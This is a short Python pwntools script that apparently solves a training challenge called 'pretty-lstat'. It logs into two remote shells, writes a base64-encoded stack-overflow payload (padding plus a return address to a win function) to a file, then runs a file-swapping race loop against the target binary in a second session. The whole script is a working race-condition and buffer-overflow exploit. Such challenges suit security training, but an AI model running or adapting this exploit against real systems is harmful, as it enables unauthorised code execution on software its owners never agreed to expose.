from pwn import *
import sys

# win_address = 0x401296

# payload = b'A' * 72
# payload += p64(win_address)
# hello = b'Hello, World!\n'

# with open('exploit.txt', 'wb') as f:
#     f.write(payload)


def get_token():
    r = remote('pretty-lstat.training.offensivedefensive.it', 8080, ssl=True)
    r.recvuntil(b'token: ')
    token = r.recvline().strip()
    return token

token = get_token()

c1 = remote('private.training.offensivedefensive.it', 8080, ssl=True)
c1.recvuntil(b'Token: ')
c1.sendline(token)
c1.recvuntil(b':/$')

c2 = remote('private.training.offensivedefensive.it', 8080, ssl=True)
c2.recvuntil(b'Token: ')
c2.sendline(token)
c2.recvuntil(b':/$')

print("Create exploit.txt")
#c1.sendline(b'(echo -n -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x12\x40\x00\x00\x00\x00\x00") > /home/user/exploit.txt')
c1.sendline(b'echo -n "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBlhJAAAAAAAA=" | base64 -d > /home/user/exploit.txt')
c1.recvuntil(b':/$')
print("Create hello.txt")
c1.sendline(b'echo -n -e "Hello, world" > /home/user/hello.txt')
c1.recvuntil(b':/$')
print("Create data.txt")
c1.sendline(b'touch /home/user/data.txt')
c1.recvuntil(b':/$')

print("Triggering while loop")
c1.sendline(b'while true; do cp /home/user/hello.txt /home/user/data.txt; cp /home/user/exploit.txt /home/user/data.txt; done')


print("running pretty_lstat")
c2.sendline(b'while true; do /home/user/pretty_lstat /home/user/data.txt /home/user/data.txt /home/user/data.txt ;done')

#c1.interactive()
c2.interactive()